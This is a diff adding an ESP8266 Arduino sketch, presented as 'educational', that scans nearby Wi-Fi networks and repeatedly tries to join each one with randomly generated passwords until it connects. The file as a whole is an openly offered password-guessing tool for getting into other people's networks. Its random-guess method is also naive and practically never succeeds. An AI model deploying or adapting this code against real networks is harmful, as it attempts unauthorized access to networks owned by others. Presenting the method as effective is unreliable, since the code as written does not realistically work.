@@ -1,0 +1,84 @@
+#include <ESP8266WiFi.h>
+
+const int LED_PIN = LED_BUILTIN;
+
+// WiFi Scanner with automated password generator 
+// This program is developed by LineCode.Ro / Project_Luna.
+// Any modifications must be attributed to the author.
+// Suggestions for modifying this code are welcome.
+// This code is created solely for EDUCATIONAL PURPOSES.
+// Any illegal use will be subject to legal consequences.
+// The information is displayed in the Serial Monitor in any console (Arduino, terminal etc).
+void setup() {
+    Serial.begin(115200);
+    pinMode(LED_PIN, OUTPUT);
+
+    WiFi.mode(WIFI_STA);
+    WiFi.begin();
+
+    Serial.println("Scanning for available Wi-Fi networks...");
+    int n = WiFi.scanNetworks();
+    if (n == 0) {
+        Serial.println("No Wi-Fi networks found.");
+    } else {
+        Serial.print(n);
+        Serial.println(" Wi-Fi networks found:");
+        bool connected = false;
+        int attempts = 0;
+        while (!connected) {
+            String ssid = WiFi.SSID(attempts % n);
+            Serial.print("Attempting to connect to: ");
+            Serial.println(ssid);
+            String password = generatePassword(random(9, 13));
+            Serial.print("   Generated password: ");
+            Serial.println(password);
+            WiFi.begin(ssid.c_str(), password.c_str());
+            pulseLED(); // Pulse LED during connection attempt
+            delay(500);
+            if (WiFi.status() == WL_CONNECTED) {
+                connected = true;
+                Serial.println("\nConnected successfully!");
+                Serial.print("IP Address: ");
+                Serial.println(WiFi.localIP());
+                digitalWrite(LED_PIN, HIGH); // Stop pulsing and turn on LED when connected
+            } else {
+                Serial.println("   Unable to connect with this password.");
+                attempts++;
+                if (!connected) {
+                    Serial.println("Waiting before next connection attempt...");
+                    delay(5000); // Wait for 5 seconds before next connection attempt
+                }
+            }
+        }
+    }
+}
+
+void loop() {}
+
+String generatePassword(int length) {
+    const char charset[] = "!@#$%^&*()_+{}[]|:;<>,.?/";
+    const char alphanum[] = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+    const int charsetLen = sizeof(charset) - 1;
+    const int alphanumLen = sizeof(alphanum) - 1;
+
+    String password = "";
+    for (int i = 0; i < length; i++) {
+        if (i % 2 == 0) { // Add a character from the charset
+            password += charset[random(0, charsetLen)];
+        } else { // Add a character from alphanum
+            password += alphanum[random(0, alphanumLen)];
+        }
+    }
+
+    return password;
+}
+
+void pulseLED() {
+    // Pulse LED
+    for (int i = 0; i < 3; i++) {
+        digitalWrite(LED_PIN, HIGH);
+        delay(100);
+        digitalWrite(LED_PIN, LOW);
+        delay(100);
+    }
+}
